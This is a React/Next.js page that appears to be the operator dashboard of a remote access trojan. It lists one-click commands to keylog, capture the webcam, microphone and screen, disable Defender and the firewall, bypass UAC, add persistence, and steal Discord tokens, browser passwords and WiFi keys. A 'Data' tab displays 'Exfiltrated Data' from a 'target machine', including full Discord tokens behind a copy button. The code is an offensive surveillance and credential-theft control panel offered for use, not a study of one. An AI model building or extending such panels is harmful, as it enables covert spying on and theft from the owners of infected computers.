'use client'

import { useState, useEffect, useRef, useCallback } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { Button, Badge, Input, Spinner } from "@/components/ui"
import { useParams, useRouter } from "next/navigation"
import toast from "react-hot-toast"
import dynamic from "next/dynamic"

const MapComponent = dynamic(() => import("./MapView"), { ssr: false })

const COMMAND_CATEGORIES = [
  {
    title: "Core", icon: "⚙️", commands: [
      { label: "System Info", cmd: "!sysinfo" },
      { label: "Public IP", cmd: "!publicip" },
      { label: "Admin Check", cmd: "!admincheck" },
      { label: "Voice", cmd: '!voice "Hello from admin"' },
      { label: "Help", cmd: "!help" },
    ]
  },
  {
    title: "System", icon: "💻", commands: [
      { label: "Shutdown", cmd: "!shutdown" },
      { label: "Restart", cmd: "!restart" },
      { label: "Logoff", cmd: "!logoff" },
      { label: "Block Input", cmd: "!block" },
      { label: "Unblock Input", cmd: "!unblock" },
      { label: "Task Manager OFF", cmd: "!disabletaskmgr" },
      { label: "Task Manager ON", cmd: "!enabletaskmgr" },
      { label: "Kill Process", cmd: "!prockill " },
      { label: "List Processes", cmd: "!listprocess" },
      { label: "Blue Screen", cmd: "!bluescreen" },
      { label: "Beep", cmd: "!beep" },
    ]
  },
  {
    title: "Surveillance", icon: "👁️", commands: [
      { label: "Screenshot", cmd: "!screenshot" },
      { label: "Webcam Pic", cmd: "!webcampic" },
      { label: "Clipboard", cmd: "!clipboard" },
      { label: "Idle Time", cmd: "!idletime" },
      { label: "Keylog Start", cmd: "!keylog" },
      { label: "Microphone", cmd: "!mic" },
    ]
  },
  {
    title: "Files", icon: "📁", commands: [
      { label: "Current Dir", cmd: "!currentdir" },
      { label: "Change Dir", cmd: "!cd " },
      { label: "Upload File", cmd: "!upload " },
      { label: "Download File", cmd: "!download " },
      { label: "Delete File", cmd: "!delete " },
      { label: "Execute", cmd: "!execute " },
      { label: "Write File", cmd: "!write " },
    ]
  },
  {
    title: "Network", icon: "🌐", commands: [
      { label: "IP Info", cmd: "!ipinfo" },
      { label: "Geolocate", cmd: "!geolocate" },
      { label: "WiFi Passwords", cmd: "!wifi" },
    ]
  },
  {
    title: "Security", icon: "🔒", commands: [
      { label: "Disable Defender", cmd: "!disabledefender" },
      { label: "Disable Firewall", cmd: "!disablefirewall" },
      { label: "Grab Tokens", cmd: "!grabtokens" },
      { label: "Discord Info", cmd: "!discordinfo" },
      { label: "Browser Passwords", cmd: "!browserpasswords" },
      { label: "UAC Bypass", cmd: "!uacbypass" },
    ]
  },
  {
    title: "Persistence", icon: "🔄", commands: [
      { label: "Add to Startup", cmd: "!startup" },
      { label: "Critical Process", cmd: "!critproc" },
      { label: "Uncritical", cmd: "!uncritproc" },
    ]
  },
  {
    title: "Other", icon: "✨", commands: [
      { label: "Wallpaper", cmd: "!wallpaper " },
      { label: "Audio", cmd: "!audio " },
      { label: "Kill Switch", cmd: "!killswitch" },
      { label: "Exit Client", cmd: "!exit" },
    ]
  },
]

function formatDate(dateStr: string): string {
  return new Date(dateStr).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", second: "2-digit" })
}

export default function ClientDetailPage() {
  const params = useParams()
  const router = useRouter()
  const [client, setClient] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data">("screen")
  const [command, setCommand] = useState("")
  const [commandHistory, setCommandHistory] = useState<any[]>([])
  const [sending, setSending] = useState(false)
  const terminalRef = useRef<HTMLDivElement>(null)
  const [collapsed, setCollapsed] = useState<Record<string, boolean>>({})

  // Screen stream
  const [screenshot, setScreenshot] = useState<string | null>(null)
  const [screenshotTime, setScreenshotTime] = useState("")
  const [streaming, setStreaming] = useState(false)
  const streamRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // Geo
  const [geo, setGeo] = useState<any>(null)
  // Exfiltrated data
  const [exfilData, setExfilData] = useState<any[]>([])
  const [exfilByType, setExfilByType] = useState<Record<string, any[]>>({})
  const [exfilLoading, setExfilLoading] = useState(false)

  const fetchClient = useCallback(async () => {
    if (!params.id) return
    const res = await fetch(`/api/remote/clients/${params.id}`)
    if (!res.ok) return
    const data = await res.json()
    setClient(data.client)
    setCommandHistory((data.client?.commands || []).slice(0, 100))
    if (data.client?.screenCaptures?.length) {
      const last = data.client.screenCaptures[data.client.screenCaptures.length - 1]
      if (last.imagePath) setScreenshot(last.imagePath)
    }
  }, [params.id])

  useEffect(() => { fetchClient().finally(() => setLoading(false)) }, [fetchClient])

  useEffect(() => {
    if (!client?.ipPublic) return
    fetch(`/api/remote/clients/${params.id}/geo`).then(r => r.json()).then(setGeo).catch(() => {})
  }, [client?.ipPublic, params.id])

  function fetchExfilData() {
    if (!params.id) return
    setExfilLoading(true)
    fetch(`/api/remote/clients/${params.id}/data`)
      .then(r => r.json())
      .then(d => { setExfilData(d.data || []); setExfilByType(d.byType || {}) })
      .catch(() => {})
      .finally(() => setExfilLoading(false))
  }

  useEffect(() => {
    if (activeTab === "data" && params.id) fetchExfilData()
  }, [activeTab, params.id])

  // Auto-refresh every 15s
  useEffect(() => {
    const t = setInterval(fetchClient, 15000)
    return () => clearInterval(t)
  }, [fetchClient])

  // Screen stream
  function toggleStream() {
    if (streaming) {
      if (streamRef.current) { clearInterval(streamRef.current); streamRef.current = null }
      setStreaming(false)
      return
    }
    setStreaming(true)
    async function capture() {
      try {
        await fetch(`/api/remote/clients/${params.id}/command`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: "!screenshot" }),
        })
        setTimeout(async () => {
          const res = await fetch(`/api/remote/clients/${params.id}`)
          const d = await res.json()
          const sc = d.client?.screenCaptures
          if (sc?.length) {
            const last = sc[sc.length - 1]
            if (last.imagePath) { setScreenshot(last.imagePath); setScreenshotTime(formatDate(last.createdAt)) }
          }
        }, 2000)
      } catch {}
    }
    capture()
    streamRef.current = setInterval(capture, 5000)
  }

  useEffect(() => {
    return () => { if (streamRef.current) clearInterval(streamRef.current) }
  }, [])

  async function sendCommand(cmd: string) {
    if (!cmd.trim()) return
    setSending(true)
    try {
      const res = await fetch(`/api/remote/clients/${params.id}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: cmd }),
      })
      if (!res.ok) throw new Error("Failed")
      toast.success(`Sent: ${cmd.substring(0, 30)}`)
      setCommandHistory(prev => [{ id: Date.now().toString(), command: cmd, status: "success", executedAt: new Date().toISOString() }, ...prev])
      setCommand("")
    } catch {
      toast.error("Failed to send command")
    } finally {
      setSending(false)
    }
  }

  function toggleCategory(title: string) {
    setCollapsed(prev => ({ ...prev, [title]: !prev[title] }))
  }

  if (loading) {
    return (
      <div className="space-y-6">
        <div className="h-8 w-48 bg-muted rounded animate-pulse" />
        <div className="h-[500px] bg-muted rounded-xl animate-pulse" />
      </div>
    )
  }

  if (!client) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <p className="text-muted-foreground">Client not found</p>
          <Button onClick={() => router.push("/dashboard/remote/clients")} className="mt-4">Back</Button>
        </div>
      </div>
    )
  }

  const isOnline = client.status === "online"
  const flagEmoji = client.countryCode ? String.fromCodePoint(...[...client.countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)) : ""

  const tabs = [
    { id: "screen" as const, label: "Screen", icon: "M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" },
    { id: "map" as const, label: "Map", icon: "M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z M12 10a2 2 0 100 4 2 2 0 000-4z" },
    { id: "overview" as const, label: "Info", icon: "M4 6h16M4 12h16M4 18h16" },
    { id: "terminal" as const, label: "Commands", icon: "M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z M14 2v6h6" },
    { id: "screenshots" as const, label: "Gallery", icon: "M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01" },
    { id: "data" as const, label: "Data", icon: "M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M9 3h6M12 3v4" },
  ]

  return (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between flex-wrap gap-2">
        <div className="flex items-center gap-3">
          <button onClick={() => router.push("/dashboard/remote/clients")} className="w-8 h-8 rounded-lg hover:bg-zinc-800 flex items-center justify-center transition-colors">
            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 12H5m7-7l-7 7 7 7"/></svg>
          </button>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xl font-bold text-white">{client.hostname || client.clientId?.substring(0, 8)}</h1>
              {flagEmoji && <span className="text-lg">{flagEmoji}</span>}
              <Badge variant={isOnline ? "success" : "secondary"} className="text-[10px]">
                {isOnline ? "ONLINE" : "OFFLINE"}
              </Badge>
            </div>
            <p className="text-xs text-zinc-400">{client.ipPublic} · {client.os} · {client.user || "unknown"}</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <Button size="sm" onClick={() => router.push("/dashboard/remote/clients")}>Back to Clients</Button>
        </div>
      </div>

      {/* Tab Bar */}
      <div className="flex gap-1 p-1 bg-zinc-900/60 rounded-2xl w-fit border border-zinc-800 overflow-x-auto">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
              activeTab === tab.id ? "bg-primary/20 text-primary" : "text-zinc-400 hover:text-white"
            }`}
          >
            <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d={tab.icon} />
            </svg>
            {tab.label}
          </button>
        ))}
      </div>

      {/* SCREEN TAB - Large live view */}
      {activeTab === "screen" && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">Live Screen</h2>
            <div className="flex items-center gap-3">
              {screenshotTime && <span className="text-[10px] text-zinc-500">Last: {screenshotTime}</span>}
              <Button size="sm" onClick={toggleStream} variant={streaming ? "danger" : "primary"}>
                {streaming ? "▮▮ Stop Stream" : "▶ Start Stream"}
              </Button>
            </div>
          </div>
          {screenshot ? (
            <div className="rounded-xl border border-zinc-800 bg-black overflow-hidden">
              <img
                src={screenshot}
                alt="Screen"
                className="w-full h-auto max-h-[70vh] object-contain"
                style={{ imageRendering: "auto" }}
              />
            </div>
          ) : (
            <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 flex items-center justify-center h-[400px]">
              <div className="text-center space-y-3">
                <span className="text-6xl block">📺</span>
                <p className="text-zinc-400">No screen capture yet</p>
                <Button size="sm" onClick={() => sendCommand("!screenshot")}>Request Screenshot</Button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* MAP TAB */}
      {activeTab === "map" && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">Geolocation</h2>
            {geo && <span className="text-xs text-zinc-400">{geo.city}, {geo.country}</span>}
          </div>
          <div className="rounded-xl border border-zinc-800 overflow-hidden h-[450px]">
            <MapComponent lat={geo?.lat || 0} lng={geo?.lng || 0} label={client.hostname || client.clientId} />
          </div>
          {geo && geo.lat !== 0 && (
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
              {[
                { label: "City", value: geo.city },
                { label: "Country", value: `${geo.country} ${flagEmoji}` },
                { label: "ISP", value: geo.isp },
                { label: "Timezone", value: geo.timezone },
              ].map(item => (
                <div key={item.label} className="p-3 rounded-xl border border-zinc-800 bg-zinc-900/60">
                  <p className="text-[10px] text-zinc-500 uppercase">{item.label}</p>
                  <p className="text-sm text-white font-medium truncate">{item.value || "-"}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* OVERVIEW TAB */}
      {activeTab === "overview" && (
        <div className="grid md:grid-cols-2 gap-4">
          {/* System Info */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">System</h3>
            <div className="space-y-2">
              {[
                { label: "Hostname", value: client.hostname },
                { label: "User", value: client.user },
                { label: "OS", value: client.os },
                { label: "Version", value: client.version },
                { label: "Client ID", value: client.clientId },
                { label: "Screen", value: client.screenWidth ? `${client.screenWidth}x${client.screenHeight}` : "-" },
              ].map(item => (
                <div key={item.label} className="flex justify-between text-xs"><span className="text-zinc-500">{item.label}</span><span className="font-mono text-zinc-300">{item.value || "-"}</span></div>
              ))}
            </div>
          </div>

          {/* Performance */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Performance</h3>
            <div className="space-y-3">
              <div>
                <div className="flex justify-between text-xs mb-1"><span className="text-zinc-500">CPU</span><span className="font-mono text-zinc-300">{client.cpu != null ? `${client.cpu.toFixed(1)}%` : "-"}</span></div>
                <div className="h-1.5 bg-zinc-800 rounded-full"><div className="h-full rounded-full bg-primary transition-all" style={{ width: `${client.cpu || 0}%` }} /></div>
              </div>
              <div>
                <div className="flex justify-between text-xs mb-1"><span className="text-zinc-500">RAM</span><span className="font-mono text-zinc-300">{client.ramTotal ? `${(client.ramUsed || 0).toFixed(1)} / ${client.ramTotal.toFixed(1)} GB` : "-"}</span></div>
                <div className="h-1.5 bg-zinc-800 rounded-full"><div className="h-full rounded-full bg-green-500 transition-all" style={{ width: client.ramTotal ? `${((client.ramUsed || 0) / client.ramTotal) * 100}%` : "0%" }} /></div>
              </div>
            </div>
          </div>

          {/* Network */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Network</h3>
            <div className="space-y-2">
              {[
                { label: "Public IP", value: client.ipPublic },
                { label: "Local IP", value: client.ipLocal },
                { label: "Country", value: `${flagEmoji} ${client.country || "-"}` },
                { label: "ISP", value: client.isp },
                { label: "First Seen", value: new Date(client.firstSeen).toLocaleDateString() },
                { label: "Last Seen", value: new Date(client.lastSeen).toLocaleString() },
              ].map(item => (
                <div key={item.label} className="flex justify-between text-xs"><span className="text-zinc-500">{item.label}</span><span className="font-mono text-zinc-300 truncate ml-2">{item.value || "-"}</span></div>
              ))}
            </div>
          </div>

          {/* Quick Actions */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Quick Actions</h3>
            <div className="grid grid-cols-2 gap-2">
              {[
                { label: "Screenshot", cmd: "!screenshot", emoji: "📸" },
                { label: "System Info", cmd: "!sysinfo", emoji: "🖥️" },
                { label: "Start Stream", cmd: "", emoji: "📺", action: () => { setActiveTab("screen"); toggleStream() } },
                { label: "Geolocate", cmd: "!geolocate", emoji: "📍" },
              ].map(item => (
                <button
                  key={item.label}
                  onClick={() => item.action ? item.action() : sendCommand(item.cmd)}
                  className="p-2.5 rounded-lg border border-zinc-700 bg-zinc-800/50 hover:bg-zinc-700/50 transition-all text-xs text-left flex items-center gap-2"
                >
                  <span>{item.emoji}</span>
                  <span className="font-medium text-zinc-300">{item.label}</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* COMMANDS TAB */}
      {activeTab === "terminal" && (
        <div className="space-y-4">
          {/* Quick Command Buttons */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
            {COMMAND_CATEGORIES.map(cat => (
              <div key={cat.title} className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                <button
                  onClick={() => toggleCategory(cat.title)}
                  className="w-full flex items-center justify-between p-3 text-xs font-semibold text-zinc-300 hover:bg-zinc-800/50 transition-colors"
                >
                  <span>{cat.icon} {cat.title}</span>
                  <svg className={`w-3 h-3 transition-transform ${collapsed[cat.title] ? "" : "rotate-90"}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="9 18 15 12 9 6"/></svg>
                </button>
                {!collapsed[cat.title] && (
                  <div className="p-2 space-y-1">
                    {cat.commands.map(cmd => (
                      <button
                        key={cmd.cmd}
                        onClick={() => sendCommand(cmd.cmd)}
                        className="w-full text-left px-2 py-1.5 rounded-lg text-xs text-zinc-400 hover:bg-zinc-800 hover:text-white transition-colors flex items-center justify-between group"
                      >
                        <span>{cmd.label}</span>
                        <span className="text-[10px] text-zinc-600 font-mono opacity-0 group-hover:opacity-100 transition-opacity">{cmd.cmd.substring(0, 15)}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>

          {/* Manual Command Input */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Manual Command</h3>
            <form onSubmit={(e) => { e.preventDefault(); sendCommand(command) }} className="flex gap-2">
              <input
                type="text"
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                placeholder="Type command (e.g., !sysinfo)..."
                className="input-premium flex-1 font-mono text-sm"
              />
              <Button type="submit" disabled={sending || !command.trim()} loading={sending} size="sm">
                Send
              </Button>
            </form>
          </div>

          {/* Command History */}
          <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-3">Command History ({commandHistory.length})</h3>
            <div className="bg-black/80 rounded-lg p-3 font-mono text-xs max-h-60 overflow-y-auto space-y-1">
              {commandHistory.length === 0 ? (
                <span className="text-zinc-600">No commands executed yet.</span>
              ) : (
                commandHistory.map((cmd, i) => (
                  <div key={i} className="flex items-start gap-2">
                    <span className="text-green-400 shrink-0">$</span>
                    <div className="min-w-0 flex-1">
                      <span className="text-zinc-200">{cmd.command}</span>
                      {cmd.output && (
                        <pre className="text-zinc-500 text-[10px] mt-0.5 whitespace-pre-wrap break-all">{typeof cmd.output === 'string' ? cmd.output.substring(0, 500) : cmd.output}</pre>
                      )}
                    </div>
                    <span className="text-zinc-600 text-[10px] shrink-0">{formatDate(cmd.executedAt)}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* SCREENSHOTS GALLERY TAB */}
      {activeTab === "screenshots" && (
        <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider">Screen Captures ({client.screenCaptures?.length || 0})</h3>
            <Button size="sm" onClick={() => sendCommand("!screenshot")}>New Screenshot</Button>
          </div>
          {!client.screenCaptures?.length ? (
            <div className="text-center py-12 text-zinc-500">No screenshots yet</div>
          ) : (
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
              {client.screenCaptures?.map((sc: any) => (
                <div key={sc.id} className="rounded-lg border border-zinc-800 overflow-hidden hover:border-zinc-600 transition-colors cursor-pointer" onClick={() => { setScreenshot(sc.imagePath); setActiveTab("screen") }}>
                  {sc.imagePath ? (
                    <img src={sc.imagePath} alt="Screenshot" className="w-full aspect-video object-cover" />
                  ) : (
                    <div className="w-full aspect-video bg-zinc-800 flex items-center justify-center text-zinc-600 text-xs">Pending</div>
                  )}
                  <div className="p-2 text-[10px] text-zinc-500 flex justify-between">
                    <span>{sc.width}x{sc.height}</span>
                    <span>{formatDate(sc.createdAt)}</span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* FILES TAB */}
      {activeTab === "files" && (
        <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60">
          <h3 className="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-4">File Transfers ({client.fileTransfers?.length || 0})</h3>
          {!client.fileTransfers?.length ? (
            <div className="text-center py-8 text-zinc-500">No file transfers yet</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-xs">
                <thead>
                  <tr className="border-b border-zinc-800 text-zinc-500">
                    <th className="text-left p-2">File</th>
                    <th className="text-left p-2">Dir</th>
                    <th className="text-left p-2">Size</th>
                    <th className="text-left p-2">Status</th>
                    <th className="text-left p-2">Date</th>
                  </tr>
                </thead>
                <tbody>
                  {client.fileTransfers?.map((ft: any) => (
                    <tr key={ft.id} className="border-b border-zinc-800/50 hover:bg-zinc-800/30">
                      <td className="p-2 font-mono text-zinc-300">{ft.fileName}</td>
                      <td className="p-2"><Badge variant={ft.direction === "upload" ? "primary" : "warning"} className="text-[10px]">{ft.direction}</Badge></td>
                      <td className="p-2 text-zinc-400">{ft.fileSize ? `${(ft.fileSize / 1024).toFixed(1)}KB` : "-"}</td>
                      <td className="p-2"><Badge variant={ft.status === "completed" ? "success" : ft.status === "failed" ? "danger" : "warning"} className="text-[10px]">{ft.status}</Badge></td>
                      <td className="p-2 text-zinc-500">{new Date(ft.startedAt).toLocaleDateString()}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* DATA TAB — Exfiltrated Information */}
      {activeTab === "data" && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold uppercase tracking-wider text-zinc-400">🕵️ Exfiltrated Data</h2>
            <Button size="sm" onClick={fetchExfilData} loading={exfilLoading}>Refresh</Button>
          </div>

          {exfilLoading ? (
            <div className="flex justify-center py-12"><div className="w-5 h-5 border-2 border-zinc-600 border-t-primary rounded-full animate-spin" /></div>
          ) : exfilData.length === 0 ? (
            <div className="text-center py-12 rounded-xl border border-zinc-800 bg-zinc-900/60">
              <span className="text-4xl block mb-3">📭</span>
              <p className="text-zinc-400">No data collected yet</p>
              <p className="text-xs text-zinc-500 mt-1">Run the client on a target machine or send !steal command</p>
            </div>
          ) : (
            <>
              {/* Discord Tokens */}
              {exfilByType["discord_token"]?.length > 0 && (
                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800 flex items-center justify-between">
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <span className="text-lg">💬</span> Discord Tokens ({exfilByType["discord_token"].length})
                    </h3>
                  </div>
                  <div className="divide-y divide-zinc-800">
                    {exfilByType["discord_token"].map((item: any, i: number) => {
                      let parsed: any = {}
                      try { parsed = JSON.parse(item.data) } catch {}
                      return (
                        <div key={item.id} className="p-4 hover:bg-zinc-800/30 transition-colors">
                          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
                            <div><span className="text-zinc-500">Username:</span> <span className="text-white font-medium">{parsed.username || "?"}</span></div>
                            <div><span className="text-zinc-500">User ID:</span> <span className="text-zinc-300 font-mono">{parsed.user_id || "?"}</span></div>
                            <div><span className="text-zinc-500">Email:</span> <span className="text-zinc-300">{parsed.email || "N/A"}</span></div>
                            <div><span className="text-zinc-500">Phone:</span> <span className="text-zinc-300">{parsed.phone || "N/A"}</span></div>
                            <div><span className="text-zinc-500">Nitro:</span> <span className="text-yellow-400 font-medium">{parsed.nitro || "None"}</span></div>
                            <div><span className="text-zinc-500">Valid:</span> <Badge variant="success" className="text-[10px]">✅ Yes</Badge></div>
                            <div className="col-span-2">
                              <span className="text-zinc-500">Token:</span>
                              <div className="flex items-center gap-2 mt-0.5">
                                <code className="text-[10px] text-zinc-300 bg-black/50 px-2 py-1 rounded break-all font-mono flex-1">{parsed.token?.substring(0, 40)}...</code>
                                <button
                                  onClick={() => { navigator.clipboard.writeText(parsed.token) }}
                                  className="px-2 py-1 rounded bg-zinc-700 hover:bg-zinc-600 text-[10px] text-zinc-300 transition-colors"
                                >Copy</button>
                              </div>
                            </div>
                          </div>
                          <p className="text-[10px] text-zinc-600 mt-2">{new Date(item.createdAt).toLocaleString()}</p>
                        </div>
                      )
                    })}
                  </div>
                </div>
              )}

              {/* Browser Passwords */}
              {exfilByType["browser_passwords"]?.length > 0 && (
                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800">
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <span className="text-lg">🔑</span> Browser Passwords ({exfilByType["browser_passwords"].length})
                    </h3>
                  </div>
                  <div className="divide-y divide-zinc-800">
                    {exfilByType["browser_passwords"].map((item: any) => {
                      let parsed: any = {}
                      try { parsed = JSON.parse(item.data) } catch {}
                      return (
                        <div key={item.id} className="p-4 hover:bg-zinc-800/30">
                          <div className="flex items-center justify-between mb-2">
                            <Badge variant="warning" className="text-[10px]">{item.source || "Browser"}</Badge>
                            <span className="text-[10px] text-zinc-500">{new Date(item.createdAt).toLocaleString()}</span>
                          </div>
                          <p className="text-xs text-zinc-400 mb-2">{parsed.urls_found} saved login URLs found</p>
                          {parsed.urls && parsed.urls.length > 0 && (
                            <div className="max-h-32 overflow-y-auto bg-black/50 rounded-lg p-2">
                              {parsed.urls.map((url: string, i: number) => (
                                <p key={i} className="text-[10px] text-zinc-500 font-mono truncate">{url}</p>
                              ))}
                            </div>
                          )}
                          {parsed.note && <p className="text-[10px] text-zinc-600 mt-2">{parsed.note}</p>}
                        </div>
                      )
                    })}
                  </div>
                </div>
              )}

              {/* System Info */}
              {exfilByType["system_info"]?.length > 0 && (
                <div className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800">
                    <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                      <span className="text-lg">🖥️</span> System Info ({exfilByType["system_info"].length})
                    </h3>
                  </div>
                  {exfilByType["system_info"].slice(-1).map((item: any) => {
                    let parsed: any = {}
                    try { parsed = JSON.parse(item.data) } catch {}
                    return (
                      <div key={item.id} className="p-4 grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
                        {[
                          { l: "Hostname", v: parsed.hostname },
                          { l: "Username", v: parsed.username },
                          { l: "OS", v: parsed.os },
                          { l: "Public IP", v: parsed.public_ip },
                          { l: "Local IP", v: parsed.local_ip },
                          { l: "Hardware ID", v: parsed.hardware_id },
                          { l: "CPU", v: parsed.cpu ? `${parsed.cpu}%` : "-" },
                          { l: "RAM", v: parsed.ram_total_gb ? `${parsed.ram_used_gb?.toFixed(1) || 0} / ${parsed.ram_total_gb?.toFixed(1)} GB` : "-" },
                        ].map(({ l, v }) => (
                          <div key={l} className="p-2 rounded bg-zinc-800/30"><span className="text-zinc-500">{l}: </span><span className="text-zinc-300 font-mono">{v || "-"}</span></div>
                        ))}
                      </div>
                    )
                  })}
                </div>
              )}

              {/* Other data types */}
              {Object.entries(exfilByType).filter(([t]) => !["discord_token", "browser_passwords", "system_info"].includes(t)).map(([type, items]) => (
                <div key={type} className="rounded-xl border border-zinc-800 bg-zinc-900/60 overflow-hidden">
                  <div className="p-4 border-b border-zinc-800">
                    <h3 className="text-sm font-semibold text-white capitalize">{type.replace(/_/g, " ")} ({items.length})</h3>
                  </div>
                  <div className="p-4 space-y-2">
                    {items.map((item: any) => (
                      <div key={item.id} className="p-3 rounded-lg bg-zinc-800/30">
                        <div className="flex items-center justify-between mb-1">
                          <span className="text-[10px] text-zinc-500">{item.source || "-"}</span>
                          <span className="text-[10px] text-zinc-600">{new Date(item.createdAt).toLocaleString()}</span>
                        </div>
                        <pre className="text-xs text-zinc-300 whitespace-pre-wrap break-all max-h-32 overflow-y-auto">{item.data}</pre>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </>
          )}
        </div>
      )}
    </motion.div>
  )
}
